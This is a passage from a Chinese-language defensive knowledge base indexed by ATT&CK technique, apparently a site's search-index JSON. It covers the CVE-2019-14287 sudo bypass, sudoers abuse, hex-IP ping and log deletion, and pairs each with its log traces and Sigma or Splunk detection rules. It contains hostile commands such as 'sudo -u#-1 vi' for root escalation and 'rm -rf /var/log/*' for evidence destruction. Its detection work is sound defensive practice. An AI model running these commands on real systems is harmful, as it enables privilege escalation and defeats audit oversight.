\u3010\u5141\u8bb8\u7528\u6237\u57fa\u4e8eRunas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\uff0c\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3011\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7279\u5b9a\u7684\u7528\u6237id\uff08\u5982-1\u6216\u80054294967295\uff09\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5c3d\u7ba1Runas\u89c4\u8303\u4e2d\u660e\u786e\u89c4\u8303\u4e86\u7981\u6b62root\u8bbf\u95ee\uff0c\u4f46\u53ea\u8981Runas\u89c4\u8303\u4e2d\u4f18\u5148\u51fa\u73b0\u4e86ALL\u5173\u952e\u5b57\uff0c\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u4f7f\u7528\u6b64\u547d\u4ee4\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4</p> <p>\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u8fd0\u884c\u7684\u547d\u4ee4\uff0c\u65e5\u5fd7\u4f1a\u628a\u7528\u6237id\u8bb0\u5f55\u4e3a4294967295\uff0c\u800c\u975eroot\u3002\u6b64\u5916\uff0cPAM\u4f1a\u8bdd\u4e0d\u4f1a\u5e72\u9884\u6b64\u547d\u4ee4\u7684\u6267\u884c\u3002</p> <p>#Runas\u89c4\u8303\uff1a\u6307sudo\u914d\u7f6e\u6587\u4ef6\uff08\u4e00\u822c\u4e3a/etc/sudoers\uff09 \u4e2d\u5b9a\u4e49\u7684\u7528\u6237\u6267\u884c\u6743\u9650\u89c4\u5219</p> <p>#PAM\uff08\u53ef\u63d2\u5165\u8eab\u4efd\u9a8c\u8bc1\u6a21\u5757\uff09\uff1aPAM\u5c06\u7a0b\u5e8f\u5f00\u53d1\u4e0e\u8ba4\u8bc1\u65b9\u5f0f\u8fdb\u884c\u5206\u79bb\uff0c\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8c03\u7528\u9644\u52a0\u7684\u201c\u8ba4\u8bc1\u201d\u6a21\u5757\u5b8c\u6210\u81ea\u5df1\u7684\u5de5\u4f5c\u3002\u672c\u5730\u7cfb\u7edf\u7ba1\u7406\u5458\u901a\u8fc7\u914d\u7f6e\u9009\u62e9\u8981\u4f7f\u7528\u67d0\u79cd\u8ba4\u8bc1\u6a21\u5757\u3002</p> <p>\u5f71\u54cd\u7248\u672c\uff1asudo 1.8.28 \u4ee5\u4e0b\u7248\u672c</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux auth.log\u65e5\u5fd7\uff0c\u65e0\u9700\u523b\u610f\u914d\u7f6e\u3002</p> <p>\u6a21\u62df\u73af\u5883\uff1aubuntu 19.04</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <p>1\u3001\u521b\u5efa\u666e\u901a\u7528\u6237\u8d26\u6237\uff1b</p> <p>2\u3001\u5207\u6362root\u6743\u9650\uff0c\u4fee\u6539/etc/sudoers \u914d\u7f6e\u6587\u4ef6\u5199\u5165\u5982\u4e0b\u89c4\u5219</p> <pre><code>abc ALL = (ALL, !root) /usr/bin/vi\n</code></pre> <p>3\u3001\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u4fee\u6539/etc/sudoers\u7684\u8bfb\u5199\u6743\u9650\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u5bf9\u6b64\u6587\u4ef6\u8fdb\u884c\u5199\u5165\u3002\u540c\u65f6\uff0c\u5728\u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c\u4f60\u9700\u8981\u4fee\u6539\u6b64\u6587\u4ef6\u7684\u6743\u9650\u4e3a\u53ea\u8bfb</p> <pre><code> chmod u+w /etc/sudoers  \uff08\u4fee\u6539\u6743\u9650\uff0c\u9ed8\u8ba4\u53ea\u8bfb\uff09\n chmod u-w /etc/sudoers   \uff08\u53ea\u8bfb\u6743\u9650\uff0c\u5f88\u91cd\u8981\uff09\n</code></pre> <p>4\u3001\u6d4b\u8bd5\uff1a\u6267\u884csudo vi \u65e0\u6743\u9650</p> <p>\u200b      \u6267\u884csudo -u#-1 vi \u7a81\u7834\u9650\u5236\u6210\u529f\u4ee5root\u8eab\u4efd\u6267\u884c</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>Oct 18 11:09:54 icbc sudo:  test321 : TTY=pts/1 ; PWD=/ ; USER=#-1 ; COMMAND=/usr/bin/id\nOct 18 11:11:59 icbc sudo:  test321 : TTY=pts/1 ; PWD=/ ; USER=#4294967295 ; COMMAND=/usr/bin/id\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: CVE-2019-14287 sudo \u914d\u7f6e\u4e0d\u5f53-\u6743\u9650\u63d0\u5347\ndescription: Ubuntu19.04 x64\u6d4b\u8bd5\u7ed3\u679c\uff08\u5f53sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u7684ALL\u5173\u952e\u5b57\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u6309\u901a\u8fc7\u6307\u5b9a\u7528\u6237ID-1\u62164294967295\u6210\u4e3aroot\u7528\u6237\u3002\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5373\u4f7fRunas\u89c4\u8303\u660e\u786e\u7981\u6b62root\u7528\u6237\u8bbf\u95ee\uff0c\u53ea\u8981\u5728Runas\u89c4\u8303\n \u6761\u4ef6\u4e2d\u9996\u5148\u5217\u51faALL\u5173\u952e\u5b57\u5373\u53ef\uff09\nreferences: https://sysdig.com/blog/detecting-cve-2019-14287/\ntags: T1548-003\nstatus: experimental\nauthor: Blue team\nlogsource:\n    product: linux\ndetection:\n    selection:\n        proc.name: 'sudo:'\n        proc.USER:\n            - '#-1'\n            - '#4294967295'\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u76ee\u524d\u4e3b\u8981\u5f71\u54cd\u4ee5\u4e0b\u7248\u672c\uff1a</p> <p>sudo -V &lt; 1.8.28</p> <p>\u5347\u7ea7sudo\u7248\u672c\u81f31.8.28\u4ee5\u4e0a</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1548-003</p> <p>https://attack.mitre.org/techniques/T1548/003/</p> <p>\u68c0\u6d4bCVE-2019-14287</p> <p>https://sysdig.com/blog/detecting-cve-2019-14287/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/","title":"T1169-linux-Sudo","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>sudoers\u6587\u4ef6<code>/etc/sudoers</code>\u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c<code>user1 ALL=(ALL) NOPASSWD: ALL</code> [1]\u7684\u884c\u7684\u5bc6\u7801\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>cat /etc/sudoers</p> <p>vim /etc/sudoers</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_4","title":"\u573a\u666f\u4e00","text":"<p>icbc@icbc:/$ sudo cat /etc/sudoers</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_5","title":"\u573a\u666f\u4e8c","text":"<p>icbc@icbc:/$ sudo vim /etc/sudoers</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>type=USER_CMD msg=audit(1563520773.609:436): pid=3530 uid=1000 auid=1000 ses=3 msg='cwd=\"/\" cmd=636174202F6574632F7375646F657273 terminal=pts/0 res=success'</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u89c4\u5219","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=linux sourcetype=\"linux_audit\" sudoers_110\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219\uff1aroot@icbc:~# auditctl -w /etc/sudoers -p war -k sudoers_110</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_8","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-Sudo/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1548-003</p> <p>https://attack.mitre.org/techniques/T1548/003/</p> <p>Audit\u914d\u7f6e\u624b\u518c</p> <p>https://www.cnblogs.com/bldly1989/p/7204358.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/","title":"T1027-003-win-Ping Hex IP","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7\u52a0\u5bc6\uff0c\u7f16\u7801\u6216\u5176\u4ed6\u65b9\u5f0f\u6df7\u6dc6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u6587\u4ef6\u5728\u7cfb\u7edf\u4e2d\u6216\u4f20\u8f93\u4e2d\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u4f7f\u5176\u96be\u4ee5\u53d1\u73b0\u6216\u5206\u6790\u3002\u8fd9\u662f\u5e38\u89c1\u7684\u884c\u4e3a\uff0c\u53ef\u4ee5\u8de8\u4e0d\u540c\u7684\u5e73\u53f0\u548c\u7f51\u7edc\u4f7f\u7528\uff0c\u4ee5\u9003\u907f\u9632\u5fa1\u3002</p> <p>\u6709\u6548\u8f7d\u8377\u53ef\u80fd\u88ab\u538b\u7f29\uff0c\u5b58\u6863\u6216\u52a0\u5bc6\uff0c\u4ee5\u907f\u514d\u88ab\u68c0\u6d4b\u5230\u3002\u8fd9\u4e9b\u6709\u6548\u8f7d\u8377\u53ef\u4ee5\u5728\u201c\u521d\u59cb\u8bbf\u95ee\u201d\u671f\u95f4\u6216\u4ee5\u540e\u4f7f\u7528\uff0c\u4ee5\u51cf\u8f7b\u68c0\u6d4b\u3002\u6709\u65f6\uff0c\u53ef\u80fd\u9700\u8981\u7528\u6237\u91c7\u53d6\u884c\u52a8\u624d\u80fd\u6253\u5f00\u548c\u53cd\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f\u4ee5\u4f9b\u7528\u6237\u6267\u884c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u538b\u7f29\u6216\u5b58\u6863\u811a\u672c\uff0c\u4f8b\u5982Javascript\u3002</p> <p>\u8fd8\u53ef\u4ee5\u5bf9\u6587\u4ef6\u7684\u67d0\u4e9b\u90e8\u5206\u8fdb\u884c\u7f16\u7801\u4ee5\u9690\u85cf\u7eaf\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u5b83\u4eec\u5c06\u6709\u52a9\u4e8e\u9632\u5fa1\u8005\u8fdb\u884c\u53d1\u73b0\u3002\u6709\u6548\u8f7d\u8377\u4e5f\u53ef\u80fd\u88ab\u62c6\u5206\u4e3a\u770b\u4f3c\u826f\u6027\u7684\u5355\u72ec\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4ec5\u5728\u91cd\u65b0\u7ec4\u5408\u540e\u624d\u4f1a\u663e\u793a\u6076\u610f\u529f\u80fd\u3002</p> <p>\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u6df7\u6dc6\u4ece\u6709\u6548\u8f7d\u8377\u6267\u884c\u7684\u547d\u4ee4\u6216\u76f4\u63a5\u901a\u8fc7\u547d\u4ee4\u884c\u754c\u9762\u6267\u884c\u7684\u547d\u4ee4\u3002\u73af\u5883\u53d8\u91cf\uff0c\u522b\u540d\uff0c\u5b57\u7b26\u548c\u5176\u4ed6\u5e73\u53f0/\u8bed\u8a00\u7279\u5b9a\u7684\u8bed\u4e49\u53ef\u7528\u4e8e\u89c4\u907f\u57fa\u4e8e\u7b7e\u540d\u7684\u68c0\u6d4b\u548c\u767d\u540d\u5355\u673a\u5236\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u653b\u51fb\u8005\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684IP\u5730\u5740\u8fdb\u884cping\u547d\u4ee4\u63a2\u6d4b\u4e3b\u673a\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>windows 2012\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf</p> <p></p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Ping Hex IP\ndescription: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences:\n    - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ping_hex_ip.yml\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n    selection:\n        CommandLine:\n            - '*\\ping.exe 0x*'\n            - '*\\ping 0x*'\n    condition: selection\nlevel: high\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1027-003</p> <p>https://attack.mitre.org/techniques/T1027/003/</p> <p>IP\u5730\u5740\u8fdb\u5236\u8f6c\u6362</p> <p>https://tool.520101.com/wangluo/jinzhizhuanhuan/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/","title":"T1027-005-linux-\u4e3b\u673a\u4e0a\u7684\u76d1\u6d4b\u7ec4\u4ef6\u5220\u9664","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u751f\u6210\u7684\u8bb0\u5f55\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u53ef\u80fd\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u884c\u4e3a\u90fd\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u8bb0\u5f55\uff0c\u6bd4\u5982\u5178\u578b\u7684windows\u65e5\u5fd7\u3001linux\u548cMac\u7684bash\u5386\u53f2\u8bb0\u5f55\u6216\u8005/var/log\u4e0b\u7684\u65e5\u5fd7\u6587\u4ef6\u3002</p> <p>\u653b\u51fb\u8005\u5e72\u6270\u4e8b\u4ef6\u7684\u8bb0\u5f55\uff0c\u53ef\u4ee5\u7834\u574f\u5b89\u5168\u8bbe\u5907\u7684\u68c0\u6d4b\u4e0e\u544a\u8b66\uff0c\u4ece\u800c\u5bfc\u81f4\u6076\u610f\u653b\u51fb\u4e8b\u4ef6\u672a\u88ab\u901a\u62a5\u3002\u7531\u4e8e\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u7684\u5f02\u5e38\u60c5\u51b5\uff0c\u8fd8\u53ef\u80fd\u4f7f\u5b89\u5168\u4eba\u5458\u7684\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u66f4\u52a0\u56f0\u96be\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>rm -rf  /var/log/*</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ sudo rm -r /var/log/icbc.log</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u57fa\u4e8eaudit\u65e5\u5fd7</p> <p>\u6682\u65e0</p> <p>\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55</p> <p>icbc@icbc:/$ history</p> <p>20  sudo rm -r /var/log/icbc.log   \uff08\u6ce8\u610f\u8fd9\u91cc\u5220\u9664\u7684\u662f\u6d4b\u8bd5log\u6587\u4ef6\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","title":"splunk\u68c0\u6d4b\u89c4\u5219","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#audit","title":"\u57fa\u4e8eaudit\u65e5\u5fd7","text":"<p>index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,euid,exe,key index=linux sourcetype=linux_audit type=PATH name=*.log nametype=delete</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#bash","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55","text":"<p>index=linux sourcetype=\"bash_history\" rm * .log | table host, user_name, bash_command</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1027-005</p> <p>https://attack.mitre.org/techniques/T1027/005/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/","title":"T1027-005-windows-SDelete\u5220\u9664\u6587\u4ef6","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u7684\u751f\u6210\u7269\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u5c3d\u7ba1\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u5178\u578b\u7684\u6709\u673a\u7cfb\u7edf\u65e5\u5fd7\u4f1a\u88ab\u6355\u83b7\u4e3aWindows\u4e8b\u4ef6\u6216Linux/MacOS\u6587\u4ef6\uff0c\u5982Bash History\u548c/var/log/*\u3002</p> 